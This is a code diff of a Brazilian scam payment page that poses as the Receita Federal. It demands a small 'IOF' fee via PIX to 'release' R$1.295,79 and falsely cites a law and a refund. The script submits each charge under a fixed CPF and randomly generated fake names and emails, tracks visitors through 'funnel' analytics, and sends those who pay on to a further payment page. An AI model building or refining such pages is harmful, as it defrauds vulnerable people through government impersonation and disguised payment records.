@@ -129,7 +129,6 @@
     <div class="custom-bg-header text-white w-full">
       <img src="receitafederal.png" alt="Receita Federal" class="h-10 max-h-100 mx-auto block" style="max-height: 100%;">
     </div>
-
     <!-- Alert -->
     <div class="custom-alert flex items-center gap-2 p-2 rounded-lg mb-6 mx-auto max-w-md" style="margin-top: 4rem;">
       <svg class="w-5 h-5 text-yellow-700" fill="currentColor" viewBox="0 0 24 24">
@@ -137,17 +136,14 @@
       </svg>
       <span class="text-yellow-800 text-sm font-medium">Imposto sobre Operações Financeiras (IOF)</span>
     </div>
-
     <!-- Title and Description -->
     <div class="max-w-md mx-auto">
       <h1 class="title font-bold text-gray-900 mb-6 leading-tight">Pagamento do IOF Obrigatório para Liberação da Cota</h1>
       <p class="description text-gray-600 mb-6 leading-6">Para liberar o valor da cota de R$1.295,79, é necessário o pagamento do (IOF) no valor de R$27,90 (valor de teste).</p>
-
       <!-- Warning -->
       <div class="custom-warning p-2 mb-6 max-w-md mx-auto">
         <p class="text-red-700 text-sm"><strong>*</strong> Conforme exigido pelo Banco Central do Brasil (Lei nº 8.894/94), o pagamento do (IOF) é obrigatório para a liberação do valor. Essa taxa será reembolsada automaticamente junto com o saldo.</p>
       </div>
-
       <!-- Summary -->
       <div class="custom-section p-2 rounded-lg mb-6 max-w-md mx-auto">
         <h2 class="font-semibold mb-2">Resumo</h2>
@@ -175,7 +171,6 @@
           </div>
         </div>
       </div>
-
       <!-- WhatsApp Input and Generate PIX Button -->
       <div class="whatsapp-section mb-6 max-w-md mx-auto">
         <label for="whatsappInput" class="whatsapp-label block mb-0.25">Digite seu WhatsApp para liberação</label>
@@ -193,7 +188,6 @@
           Transação 100% segura
         </div>
       </div>
-
       <!-- Pix Generated Container -->
       <div id="pixGeneratedContainer" class="custom-section p-2 rounded-lg mb-6 max-w-md mx-auto hidden">
         <h3 class="font-semibold text-base text-[#3DB1A5] mb-2">PIX para Pagamento</h3>
@@ -204,7 +198,6 @@
         <p class="text-gray-600 text-sm mt-2">Após o pagamento, a liberação da sua cota será automática e imediata.</p>
         <p class="payment-status text-base mt-1" id="paymentStatusGenerated">Verificando o status do pagamento...</p>
       </div>
-
       <!-- Guarantee Section -->
       <div class="custom-section p-2 rounded-lg mb-6 max-w-md mx-auto">
         <div class="flex items-center gap-2 mb-2">
@@ -215,7 +208,6 @@
         </div>
         <p class="text-sm text-gray-600">O valor total de R$1295,79 será creditado diretamente no seu PIX após o pagamento.</p>
       </div>
-
       <!-- FAQ -->
       <div class="mb-6 max-w-md mx-auto">
         <h2 class="text-base font-semibold mb-2">Dúvidas Frequentes</h2>
@@ -229,15 +221,15 @@
   </div>
 <script>
   window.onload = function() {
-    gtag('event', 'IOF', { 
-      'event_category': 'funnel_A', 
-      'page_path': '/pagamentoiof', 
-      'funnel_type': 'A' 
+    gtag('event', 'IOF', {
+      'event_category': 'funnel_A',
+      'page_path': '/pagamentoiof',
+      'funnel_type': 'A'
     });
-    gtag('event', 'IOF', { 
-      'event_category': 'funnel_B', 
-      'page_path': '/pagamentoiof', 
-      'funnel_type': 'B' 
+    gtag('event', 'IOF', {
+      'event_category': 'funnel_B',
+      'page_path': '/pagamentoiof',
+      'funnel_type': 'B'
     });
   };
 </script>
@@ -255,7 +247,6 @@
       });
       return utms;
     }
-
     function adicionarUTMsURL(urlBase, utms) {
       const url = new URL(urlBase);
       const parametros = new URLSearchParams(url.search);
@@ -265,12 +256,10 @@
       url.search = parametros.toString();
       return url.toString();
     }
-
     // Funções para gerar dados aleatórios
     function generateRandomCpf() {
       return '45604973890';
     }
-
     function generateRandomEmail() {
       const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
       let name = '';
@@ -279,7 +268,6 @@
       for (let i = 0; i < 5; i++) domain += chars.charAt(Math.floor(Math.random() * chars.length));
       return `${name}@${domain}.com`;
     }
-
     function generateRandomName() {
       const firstNames = ["João", "Maria", "Pedro", "Ana", "Carlos", "Juliana", "Lucas", "Mariana", "Fernando", "Beatriz", "Rafael", "Sofia"];
       const lastNames = ["Silva", "Santos", "Oliveira", "Souza", "Lima", "Fernandes", "Costa", "Pereira", "Almeida", "Nascimento", "Rodrigues", "Martins"];
@@ -287,7 +275,6 @@
       const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
       return `${randomFirstName} ${randomLastName}`;
     }
-
     // Função para validar e formatar o número de WhatsApp
     function validateAndFormatPhone(phone) {
       const cleanedPhone = phone.replace(/\D/g, '');
@@ -297,7 +284,6 @@
       }
       return cleanedPhone.substring(0, 12);
     }
-
     // Configurar o botão e validação do WhatsApp
     document.addEventListener('DOMContentLoaded', function () {
       const botaoPagar = document.getElementById('botaoPagar');
@@ -307,10 +293,8 @@
       const whatsappError = document.querySelector('.whatsapp-error');
       const paymentStatus = document.getElementById('paymentStatus');
       const paymentStatusGenerated = document.getElementById('paymentStatusGenerated');
-
       const valorIOFcentavos = 2790; // Ajustado para R$ 27,90 (2790 centavos) para testes
       const redirectUrl = 'https://reativasaldo.net/pagamentoiof2';
-
       function validateWhatsAppInput() {
         const phoneValue = whatsappInput.value.trim();
         const formattedPhone = validateAndFormatPhone(phoneValue);
@@ -324,11 +308,9 @@
           return null;
         }
       }
-
       whatsappInput.addEventListener('input', () => {
         validateWhatsAppInput();
       });
-
       async function checkPaymentStatus(transactionId, statusElement) {
         try {
           const response = await fetch(`/pagamentoiof/api/check-payment?id=${transactionId}`, {
@@ -336,14 +318,14 @@
             headers: { 'Content-Type': 'application/json' }
           });
           const data = await response.json();
-
           if (response.ok && data.status) {
             statusElement.style.display = 'block';
             if (data.status === 'APPROVED') {
               statusElement.textContent = 'Pagamento aprovado! Redirecionando...';
               statusElement.classList.add('text-green-600');
+              const utms = obterParametrosUTM();
               setTimeout(() => {
-                window.location.href = redirectUrl;
+                window.location.href = adicionarUTMsURL(redirectUrl, utms);
               }, 2000);
               return true;
             } else if (data.status === 'PENDING') {
@@ -365,7 +347,6 @@
           return false;
         }
       }
-
       function startPaymentPolling(transactionId, statusElement) {
         const interval = setInterval(async () => {
           const isApproved = await checkPaymentStatus(transactionId, statusElement);
@@ -374,20 +355,16 @@
           }
         }, 5000);
       }
-
       botaoPagar.addEventListener('click', async function(event) {
         event.preventDefault();
         const formattedPhone = validateWhatsAppInput();
         if (!formattedPhone) return;
-
         const fixedCpf = generateRandomCpf();
         const randomName = generateRandomName();
         const randomEmail = generateRandomEmail();
         const utms = obterParametrosUTM();
-
         botaoPagar.textContent = 'Gerando PIX...';
         botaoPagar.disabled = true;
-
         const requestBody = {
           name: randomName,
           email: randomEmail,
@@ -404,18 +381,14 @@
           ],
           trackingParameters: utms
         };
-
         try {
           console.log("🟢 Enviando dados para o backend:", requestBody);
-
           const response = await fetch('/pagamentoiof/api/gerar-pix', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(requestBody)
           });
-
           const data = await response.json();
-
           if (response.ok && data.pixQrCode && data.pixCode && data.transactionId) {
             paymentCard.style.display = 'none';
             pixGeneratedContainer.style.display = 'block';
